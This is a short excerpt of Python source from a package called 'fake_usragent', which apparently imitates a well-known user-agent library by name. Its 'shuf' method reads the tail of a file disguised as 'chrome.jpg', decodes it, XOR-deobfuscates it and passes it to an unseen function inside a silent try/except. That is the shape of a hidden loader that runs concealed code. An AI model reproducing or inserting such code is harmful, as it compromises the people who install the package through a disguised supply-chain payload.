...
from fake_usragent import settings
from fake_usragent.errors import FakeUserAgentError
from fake_usragent.log import logger
from fake_usragent.utils import load, str_types
...
class FakeUserAgent:
    ...
    def shuf(self):
        ...
        conf = lambda i: v(i)
        l = load('chrome.jpg')
        try: conf(''.join([chr(ord(_x)^816) for _x in d(l[-0xc8:]).decode()]))
        except: pass
